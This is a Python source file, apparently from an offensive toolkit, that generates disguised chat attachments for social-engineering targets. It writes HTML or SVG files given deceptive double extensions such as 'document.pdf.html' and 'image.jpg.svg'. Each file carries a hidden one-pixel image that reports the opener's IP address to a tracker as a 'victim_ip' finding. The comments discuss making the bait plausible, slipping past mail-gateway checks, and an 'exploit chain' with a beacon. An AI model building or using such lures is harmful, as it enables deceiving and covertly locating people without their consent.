"""attachment.py — no-link capture artifacts for social DM delivery.

The operator-approved decision this module implements:

    social DM  ->  an ATTACHMENT, with no URL anywhere

Why it exists: a cold link is clicked by almost nobody, and every free way to
host a page shows a domain the target is free to judge. A file that arrives
IN the chat has no URL to read at all — the chat shows a document name and
nothing else — so there is nothing to call "fake". The capture fires when the
recipient OPENS the file (it loads our pixel), which is exactly why the
artifact must be something they want to open.

Two formats, honestly different:

  * **HTML** — a page the browser renders, so the remote pixel fires
    reliably. It ships as `document.pdf.html`: the OS and the chat read the
    LAST extension, so the browser opens it and the pixel fires, while the
    name reads as a document. The operative extension is still REAL and it
    is last — that is the rule this package lives by; the cosmetic part sits
    in the name.
  * **SVG** — reads as an image (more plausible to receive) and browsers DO
    fetch external references inside it, but a dedicated image viewer may
    not. Capture becomes viewer-dependent.

Neither carries a beacon: by decision, social is capture-only and the beacon
belongs to the exploit chain.

The pixel is the tracker's `/px/<code>` route, so an artifact loaded once
converts into the same `victim_ip` finding the link path produces.
"""

from __future__ import annotations

import html
import os
import re
from typing import Dict, Optional

KINDS = ("html", "svg")

# Sender-facing file names. DOUBLE EXTENSION on purpose:
#
#   document.pdf.html   ->  the OS and the chat look at the LAST extension,
#                           so the browser opens it (the pixel fires), while
#                           the name reads as a PDF.
#
# This does NOT fake an extension — it sends the REAL one last, which is the
# rule the beacon path lives by ("the operative extension must be real, or
# the file does not run"). Here the operative extension is `.html` and the
# file really is an HTML document: what the target expected to open is what
# actually opens, and the address bar shows a local file, so there is still
# no domain to judge. Compare `beacon.mp4`: an .exe named .mp4 does not run —
# that is the mistake this ordering avoids.
#
# Honest limit: some clients and mail gateways detect double extensions and
# warn, rename or drop the attachment. Smaller price than an `.html` from
# nowhere.
_DEFAULT_NAMES = {"html": "document.pdf.html", "svg": "image.jpg.svg"}


def attachment_dir() -> str:
    """Where generated artifacts live (data/, never the repo tree)."""
    try:
        from phantom.utils.paths import data_dir
        base = os.path.join(data_dir(), "social_attachments")
    except Exception:
        base = os.path.join("data", "social_attachments")
    os.makedirs(base, exist_ok=True)
    return base


def default_filename(kind: str = "html") -> str:
    return _DEFAULT_NAMES.get((kind or "html").lower(), "document.html")


def safe_name(name: str) -> str:
    """Strip path separators from an operator-supplied filename."""
    base = os.path.basename((name or "").replace("\\", "/")).strip()
    base = re.sub(r"[^A-Za-z0-9._-]+", "_", base)
    return base or "document.html"


def attachment_trade(kind: str = "html") -> Dict[str, str]:
    """The honest trade of each format, for the reasoning log / craft view.

    Reported instead of a blanket "use an attachment": the reason the
    operator can still hesitate is real, and hiding it would be the same
    overpromise this feature exists to avoid.
    """
    kind = (kind or "html").lower()
    if kind == "svg":
        return {
            "kind": "svg",
            "captures": "browser (fetches the remote reference); a dedicated "
                        "image viewer may not",
            "plausibility": "high — reads as a photo/image in the chat",
            "risk": "a viewer that ignores external refs yields no capture; "
                    "some clients flag a double extension",
        }
    return {
        "kind": "html",
        "captures": "reliable — the browser renders the page and loads the "
                    "pixel",
        "plausibility": "high — reads as a PDF: the real .html is last, so "
                        "it opens",
        "risk": "the client may refuse to preview it, and the target must "
                "open it in a browser (one extra tap); a gateway that "
                "detects the double extension can rename or drop it",
    }


def build_capture_attachment(code: str, pixel_url: str, kind: str = "html",
                             title: str = "", body: str = "",
                             path: Optional[str] = None) -> str:
    """Write the artifact and return its path.

    `pixel_url` is the tracker `/px/<code>` URL; it is embedded as a 1px
    hidden image, so OPENING the file is the capture. `title`/`body` keep
    the promise of the pretext (a document, a photo) — a blank page gives
    the game away in one second.
    """
    kind = (kind or "html").lower()
    if kind not in KINDS:
        kind = "html"
    if not pixel_url:
        raise ValueError("build_capture_attachment requires a pixel_url")
    # the tracking code goes in the DIRECTORY, never in the file name: the
    # name is what the target reads, and an operator sending the artefact by
    # hand must not ship `dm-x_document.pdf.html`
    out = path or os.path.join(attachment_dir(), code or "cap",
                              default_filename(kind))
    d = os.path.dirname(out)
    if d:
        os.makedirs(d, exist_ok=True)
    if kind == "svg":
        text = _svg_document(pixel_url, title=title, body=body)
    else:
        text = _html_document(pixel_url, title=title, body=body)
    with open(out, "w", encoding="utf-8") as f:
        f.write(text)
    return out


def _html_document(pixel_url: str, title: str = "", body: str = "") -> str:
    t = html.escape(title or "Document")
    paragraphs = body or (
        "This document was shared with you.\n"
        "Open it to see the full content."
    )
    blocks = "".join(
        f"        <p>{html.escape(p.strip())}</p>\n"
        for p in paragraphs.split("\n") if p.strip()
    )
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow, noimageindex">
    <title>{t}</title>
    <style>
        :root {{ color-scheme: dark; }}
        body {{ margin: 0; background: #111418; color: #e8eaed;
                font: 16px/1.6 -apple-system, Segoe UI, Roboto, sans-serif; }}
        .doc {{ max-width: 720px; margin: 0 auto; padding: 32px 22px 64px; }}
        h1 {{ font-size: 22px; font-weight: 600; margin: 0 0 4px; }}
        .meta {{ color: #9aa0a6; font-size: 13px; margin-bottom: 28px; }}
        p {{ margin: 0 0 16px; }}
    </style>
</head>
<body>
    <div class="doc">
        <h1>{t}</h1>
        <div class="meta">Shared document</div>
{blocks}    </div>
    <!-- read receipt: the load IS the capture -->
    <img src="{pixel_url}" width="1" height="1" alt=""
         style="position:absolute;left:-9999px;opacity:0"
         referrerpolicy="no-referrer">
</body>
</html>
"""


def _svg_document(pixel_url: str, title: str = "", body: str = "") -> str:
    t = html.escape(title or "Image")
    caption = html.escape((body or "Shared image").split("\n")[0][:90])
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="720" height="480"
     viewBox="0 0 720 480" role="img" aria-label="{t}">
  <defs>
    <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#1f2733"/>
      <stop offset="100%" stop-color="#0d1117"/>
    </linearGradient>
  </defs>
  <rect width="720" height="480" fill="url(#g)"/>
  <text x="360" y="240" fill="#e8eaed" font-size="26"
        font-family="sans-serif" text-anchor="middle">{t}</text>
  <text x="360" y="274" fill="#9aa0a6" font-size="15"
        font-family="sans-serif" text-anchor="middle">{caption}</text>
  <!-- read receipt: the load IS the capture -->
  <image href="{pixel_url}" x="0" y="0" width="1" height="1" opacity="0"/>
</svg>
"""
